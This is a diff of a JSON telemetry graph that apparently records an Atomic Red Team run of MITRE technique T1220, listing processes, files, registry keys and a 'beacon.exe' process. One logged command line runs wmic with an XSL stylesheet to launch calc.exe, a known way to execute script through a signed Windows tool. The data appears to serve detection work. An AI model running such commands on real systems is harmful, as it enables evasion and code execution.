+      "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8B6011A9-C6FA-616E-9B35-01000000F101}",
+        "pid": "300",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:11",
       "label": "startupprofiledata-noninteractive",
       "type": "file",
       "group": "File",
       "properties": {
         "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF",
+        "content_hash": "",
         "parent_process_id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
-        "event_id": "23",
-        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+        "event_id": "11",
+        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:11",
         "type": "File",
         "entity_class": "FileEntity",
         "display_name": "startupprofiledata-noninteractive",
@@ -823,21 +1135,35 @@
       }
     },
     {
-      "id": "File:dbe04559cecb3d19efb8fae447034b62d02cfc7c2131163e5c3f9091504f5f2f:11",
-      "label": "20211112",
-      "type": "file",
-      "group": "File",
+      "id": "Technique:T1220",
+      "label": "T1220",
+      "type": "technique",
+      "group": "Technique",
       "properties": {
-        "file_path": "c:\\pstransactions\\20211112",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-        "event_id": "11",
-        "id": "File:dbe04559cecb3d19efb8fae447034b62d02cfc7c2131163e5c3f9091504f5f2f:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "20211112",
-        "name": "20211112"
+        "id": "Technique:T1220",
+        "name": "T1220",
+        "display_name": "T1220",
+        "type": "Technique",
+        "entity_class": "Technique"
+      }
+    },
+    {
+      "id": "Registry:6e242792f4259d16944fe0b26b7332e5d237c47112d36f502d9e13c661c0c62e:12",
+      "label": "CIMOM",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WBEM",
+        "value_name": "CIMOM",
+        "value_data": "CreateKey",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:6e242792f4259d16944fe0b26b7332e5d237c47112d36f502d9e13c661c0c62e:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "CIMOM",
+        "name": "CIMOM"
       }
     },
     {
@@ -856,48 +1182,6 @@
         "entity_class": "FileEntity",
         "display_name": "pshost.132811931243488224.2156.defaultappdomain.powershell",
         "name": "pshost.132811931243488224.2156.defaultappdomain.powershell"
-      }
-    },
-    {
-      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
-      "label": "<pspolicy_test>",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%temp%\\2\\<pspolicy_test>",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
-        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-        "event_id": "23",
-        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "<pspolicy_test>",
-        "name": "<pspolicy_test>"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
-      "label": "windows calculator",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows calculator",
-        "guid": "{8B6011A9-5BAB-618E-5BF3-04000000F101}",
-        "pid": "9468",
-        "image_path": "%system32%\\calc.exe",
-        "command_line": "%system32%\\calc.exe",
-        "original_file_name": "calc.exe",
-        "image_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
-        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows calculator",
-        "name": "windows calculator"
       }
     },
     {
@@ -925,60 +1209,47 @@
       }
     },
     {
-      "id": "File:85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b:7",
-      "label": "win32calc.exe",
-      "type": "file",
-      "group": "File",
+      "id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
+      "label": "wmiprvse.exe",
+      "type": "process",
+      "group": "Process",
       "properties": {
-        "file_path": "%system32%\\win32calc.exe",
-        "source_image_path": "%system32%\\win32calc.exe",
-        "content_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
-        "event_id": "7",
-        "id": "File:85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "win32calc.exe",
-        "name": "win32calc.exe"
+        "process_name": "wmi provider host",
+        "guid": "{8B6011A9-5BAB-618E-5AF3-04000000F101}",
+        "pid": "6320",
+        "image_path": "%system32%\\wbem\\wmiprvse.exe",
+        "command_line": "%system32%\\wbem\\wmiprvse.exe -secured -embedding",
+        "original_file_name": "wmiprvse.exe",
+        "image_hash": "MD5=E1BCE838CD2695999AB34215BF94B501,SHA256=1D7B11C9DEDDAD4F77E5B7F01DDDDA04F3747E512E0AA23D39E4226854D26CA2",
+        "command_hash": "9e73a95b7b3788d470a1455017b97348ed21c8e457b98ba9ae9acdd5bd78a350",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "wmiprvse.exe",
+        "name": "wmiprvse.exe",
+        "parent_process_id": "Process:{8B6011A9-886D-6164-0C00-00000000F101}:1",
+        "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "Registry:5d309c8edd5ca1a193fd6f4749e21f0baad452b8c2b7036020f8c62c1dd94029:13",
-      "label": "Window_Placement",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\CALC",
-        "value_name": "Window_Placement",
-        "value_data": "Binary Data",
-        "source_image_path": "%system32%\\win32calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
-        "event_id": "13",
-        "id": "Registry:5d309c8edd5ca1a193fd6f4749e21f0baad452b8c2b7036020f8c62c1dd94029:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "Window_Placement",
-        "name": "Window_Placement"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:10",
+      "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
       "label": "beacon.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "beacon.exe",
+        "process_name": "",
         "guid": "{8B6011A9-E46E-6165-1E2A-00000000F101}",
         "pid": "4584",
         "image_path": "%userprofile%\\desktop\\beacon.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1410 for beacon.exe",
+        "command_line": "",
         "original_file_name": "",
         "image_hash": "",
-        "command_hash": "3b3bdd5801eca5f967e5cfea22e193220c6fd4e33d1b78c0a020eebfbeca9cb7",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:10",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "beacon.exe",
@@ -1010,215 +1281,143 @@
       }
     },
     {
-      "id": "Registry:6e242792f4259d16944fe0b26b7332e5d237c47112d36f502d9e13c661c0c62e:12",
-      "label": "CIMOM",
+      "id": "Registry:213be8e3bfefe1d8001cb922c89361cd2e097483294b30295e260b898d77561e:12",
+      "label": "SCHANNEL",
       "type": "registry",
       "group": "Registry",
       "properties": {
-        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WBEM",
-        "value_name": "CIMOM",
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\SECURITYPROVIDERS",
+        "value_name": "SCHANNEL",
         "value_data": "CreateKey",
         "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
         "event_id": "12",
-        "id": "Registry:6e242792f4259d16944fe0b26b7332e5d237c47112d36f502d9e13c661c0c62e:12",
+        "id": "Registry:213be8e3bfefe1d8001cb922c89361cd2e097483294b30295e260b898d77561e:12",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "CIMOM",
-        "name": "CIMOM"
+        "display_name": "SCHANNEL",
+        "name": "SCHANNEL"
       }
     },
     {
-      "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
-      "label": "beacon.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{8B6011A9-E46E-6165-1E2A-00000000F101}",
-        "pid": "4584",
-        "image_path": "%userprofile%\\desktop\\beacon.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8B6011A9-E46E-6165-1E2A-00000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "beacon.exe",
-        "name": "beacon.exe"
-      }
-    },
-    {
-      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:11",
-      "label": "startupprofiledata-noninteractive",
+      "id": "File:a341332e835630462b4c54c86c5dc71203c4e7fcf9ac406c678c859a2f8e32b8:11",
+      "label": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "file_path": "%localappdata%low\\microsoft\\cryptneturlcache\\metadata\\edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+        "source_image_path": "%system32%\\wbem\\wmic.exe",
         "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BA4-618E-52F3-04000000F101}:1",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
         "event_id": "11",
-        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:11",
+        "id": "File:a341332e835630462b4c54c86c5dc71203c4e7fcf9ac406c678c859a2f8e32b8:11",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "startupprofiledata-noninteractive",
-        "name": "startupprofiledata-noninteractive"
+        "display_name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
+        "name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab"
       }
     },
     {
-      "id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
+      "id": "File:85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b:7",
       "label": "win32calc.exe",
-      "type": "process",
-      "group": "Process",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "process_name": "windows calculator",
-        "guid": "{8B6011A9-5BAC-618E-5FF3-04000000F101}",
-        "pid": "9388",
-        "image_path": "%system32%\\win32calc.exe",
-        "command_line": "%system32%\\win32calc.exe",
-        "original_file_name": "win32calc.exe",
-        "image_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
-        "command_hash": "85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
+        "file_path": "%system32%\\win32calc.exe",
+        "source_image_path": "%system32%\\win32calc.exe",
+        "content_hash": "MD5=B31A19BA38F110838119299B50517073,SHA256=D7B378A4BC4DEAE748462D216D14A20CCB1BAC1D3FFBC67711DB2CC1D8B182B7",
+        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5FF3-04000000F101}:1",
+        "event_id": "7",
+        "id": "File:85233d2b8e236db5b0b08321e2e548f84e4df58d79f0d4b9d82420ff69ce219b:7",
+        "type": "File",
+        "entity_class": "FileEntity",
         "display_name": "win32calc.exe",
-        "name": "win32calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
-        "user_id": "User:S-1-5-18"
+        "name": "win32calc.exe"
       }
     },
     {
-      "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "id": "File:e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f:7",
       "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "process_name": "",
-        "guid": "{8B6011A9-C6FA-616E-9B35-01000000F101}",
-        "pid": "300",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
+        "file_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
+        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "event_id": "7",
+        "id": "File:e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f:7",
+        "type": "File",
+        "entity_class": "FileEntity",
         "display_name": "powershell.exe",
         "name": "powershell.exe"
       }
     },
     {
-      "id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
-      "label": "wmic.exe",
+      "id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
+      "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "wmi commandline utility",
-        "guid": "{8B6011A9-5BAB-618E-59F3-04000000F101}",
-        "pid": "4656",
-        "image_path": "%system32%\\wbem\\wmic.exe",
-        "command_line": "wmic  process list \\format:\"c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl",
-        "original_file_name": "wmic.exe",
-        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
-        "command_hash": "371c5bd5b588a8602b93c2daaf5ecd7baa923a94c08b3992021b47fb7be75f24",
+        "process_name": "windows powershell",
+        "guid": "{8B6011A9-5BA4-618E-53F3-04000000F101}",
+        "pid": "4192",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\wmicscript.xsl) {exit 0} else {exit 1}}",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
+        "command_hash": "a289c2fa4bd5b61278921db6fdef4c110a51760bf0a6035f7022db4f392d2670",
         "event_id": "1",
-        "id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "wmic.exe",
-        "name": "wmic.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-58F3-04000000F101}:1",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
         "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "File:8563e9cb2edf5e5cebf2281a288a98522f431f96b57d4d3f3e3c72c0b20e0893:7",
-      "label": "wshom.ocx",
-      "type": "file",
-      "group": "File",
+      "id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
+      "label": "windows calculator",
+      "type": "process",
+      "group": "Process",
       "properties": {
-        "file_path": "%system32%\\wshom.ocx",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "content_hash": "MD5=2CCC0321D28C4EDC1C256972A34AEE59,SHA256=A6A527A6A7CE62ABDFD2348C26E9D5D87650D66BAC0AA998125335615DE220B3",
+        "process_name": "windows calculator",
+        "guid": "{8B6011A9-5BAB-618E-5BF3-04000000F101}",
+        "pid": "9468",
+        "image_path": "%system32%\\calc.exe",
+        "command_line": "%system32%\\calc.exe",
+        "original_file_name": "calc.exe",
+        "image_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
+        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
         "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
-        "event_id": "7",
-        "id": "File:8563e9cb2edf5e5cebf2281a288a98522f431f96b57d4d3f3e3c72c0b20e0893:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "wshom.ocx",
-        "name": "wshom.ocx"
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-5BAB-618E-5BF3-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows calculator",
+        "name": "windows calculator"
       }
     },
     {
-      "id": "File:ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403:7",
-      "label": "calc.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%system32%\\calc.exe",
-        "source_image_path": "%system32%\\calc.exe",
-        "content_hash": "MD5=2A5CC198FEFC04C2B6B95207A91D3668,SHA256=04FA16D1FBB5F047E7BF9756E8DDC1365AFEAAB22DD4A2C3F03E067B75BED8EA",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
-        "event_id": "7",
-        "id": "File:ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "calc.exe",
-        "name": "calc.exe"
-      }
-    },
-    {
-      "id": "Registry:f7d21ef97e196deb4535caef426e513cf157ee67cc43f852bc9a7a73811bff7d:12",
-      "label": "DelegateFolders",
+      "id": "Registry:07af341c4b0e941256441e5a609eae2877f9fc9cbd26bd0193031ef9431865f6:12",
+      "label": "ApplicationAssociationToasts",
       "type": "registry",
       "group": "Registry",
       "properties": {
-        "key_path": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\DESKTOP\\NAMESPACE",
-        "value_name": "DelegateFolders",
+        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION",
+        "value_name": "ApplicationAssociationToasts",
         "value_data": "CreateKey",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
+        "source_image_path": "%system32%\\calc.exe",
+        "parent_process_id": "Process:{8B6011A9-5BAB-618E-5DF3-04000000F101}:1",
         "event_id": "12",
-        "id": "Registry:f7d21ef97e196deb4535caef426e513cf157ee67cc43f852bc9a7a73811bff7d:12",
+        "id": "Registry:07af341c4b0e941256441e5a609eae2877f9fc9cbd26bd0193031ef9431865f6:12",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "DelegateFolders",
-        "name": "DelegateFolders"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
-      "label": "wmiprvse.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "wmi provider host",
-        "guid": "{8B6011A9-5BAB-618E-5AF3-04000000F101}",
-        "pid": "6320",
-        "image_path": "%system32%\\wbem\\wmiprvse.exe",
-        "command_line": "%system32%\\wbem\\wmiprvse.exe -secured -embedding",
-        "original_file_name": "wmiprvse.exe",
-        "image_hash": "MD5=E1BCE838CD2695999AB34215BF94B501,SHA256=1D7B11C9DEDDAD4F77E5B7F01DDDDA04F3747E512E0AA23D39E4226854D26CA2",
-        "command_hash": "9e73a95b7b3788d470a1455017b97348ed21c8e457b98ba9ae9acdd5bd78a350",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BAB-618E-5AF3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "wmiprvse.exe",
-        "name": "wmiprvse.exe",
-        "parent_process_id": "Process:{8B6011A9-886D-6164-0C00-00000000F101}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "ApplicationAssociationToasts",
+        "name": "ApplicationAssociationToasts"
       }
     },
     {
@@ -1242,217 +1441,21 @@
       }
     },
     {
-      "id": "Registry:a31abb94fe747ae9f90e9ae25f765817baeeaa26513de820b55dc1ac283d75ed:12",
-      "label": "Calc",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT",
-        "value_name": "Calc",
-        "value_data": "CreateKey",
-        "source_image_path": "%system32%\\win32calc.exe",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
-        "event_id": "12",
-        "id": "Registry:a31abb94fe747ae9f90e9ae25f765817baeeaa26513de820b55dc1ac283d75ed:12",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "Calc",
-        "name": "Calc"
-      }
-    },
-    {
-      "id": "File:e62a3e93770d6bd9e6b962f0aaa66e92afb26bdedf2e6eeca9e31c94d3f80fe4:7",
-      "label": "wmic.exe",
+      "id": "File:9cba2815b4b9eff672ddc55eb31cc48fe1ca19ea876bc0a7a17859441bb8d681:17",
+      "label": "pshost.132811931248975312.4192.defaultappdomain.powershell",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%system32%\\wbem\\wmic.exe",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "content_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072",
-        "parent_process_id": "Process:{8B6011A9-5BAB-618E-59F3-04000000F101}:1",
-        "event_id": "7",
-        "id": "File:e62a3e93770d6bd9e6b962f0aaa66e92afb26bdedf2e6eeca9e31c94d3f80fe4:7",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "wmic.exe",
-        "name": "wmic.exe"
-      }
-    },
-    {
-      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
-      "label": "<pspolicy_test>",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%temp%\\2\\<pspolicy_test>",
+        "file_path": "pshost.132811931248975312.4192.defaultappdomain.powershell",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
         "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-        "event_id": "11",
-        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "<pspolicy_test>",
-        "name": "<pspolicy_test>"
-      }
-    },
-    {
-      "id": "File:a341332e835630462b4c54c86c5dc71203c4e7fcf9ac406c678c859a2f8e32b8:11",
-      "label": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%localappdata%low\\microsoft\\cryptneturlcache\\metadata\\edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
-        "source_image_path": "%system32%\\wbem\\wmic.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BAC-618E-61F3-04000000F101}:1",
-        "event_id": "11",
-        "id": "File:a341332e835630462b4c54c86c5dc71203c4e7fcf9ac406c678c859a2f8e32b8:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab",
-        "name": "edc238bff48a31d55a97e1e93892934b_c20e0da2d0f89fe526e1490f4a2ee5ab"
-      }
-    },
-    {
-      "id": "File:a2cba089eadb89f535dcaecde0c3319ad05f80db117082107eb93c681cede542:17",
-      "label": "pshost.132811931224397609.7356.defaultappdomain.powershell",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "pshost.132811931224397609.7356.defaultappdomain.powershell",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
+        "parent_process_id": "Process:{8B6011A9-5BA4-618E-53F3-04000000F101}:1",
         "event_id": "17",
-        "id": "File:a2cba089eadb89f535dcaecde0c3319ad05f80db117082107eb93c681cede542:17",
+        "id": "File:9cba2815b4b9eff672ddc55eb31cc48fe1ca19ea876bc0a7a17859441bb8d681:17",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "pshost.132811931224397609.7356.defaultappdomain.powershell",
-        "name": "pshost.132811931224397609.7356.defaultappdomain.powershell"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{8B6011A9-5BA2-618E-51F3-04000000F101}",
-        "pid": "7356",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" & {if (test-path c:\\atomicredteam\\atomics\\t1220\\src\\msxslxmlfile.xml) {exit 0} else {exit 1}}",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
-        "command_hash": "0c20e3a732ece81e3643ce2b109e74984e5ae595c58f5758f460c22b15d60f95",
-        "event_id": "1",
-        "id": "Process:{8B6011A9-5BA2-618E-51F3-04000000F101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8B6011A9-5BAC-618E-5EF3-04000000F101}:1",
-      "label": "win32calc.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows calculator",
-        "guid": "{8B6011A9-5BAC-618E-5EF3-04000000F101}",
-        "pid": "9620",
-        "image_path": "%system32%\\win32calc.exe",
-        "command_line": "%system32%\\win32calc.exe",
-        "original_file_name": "win32calc.exe",
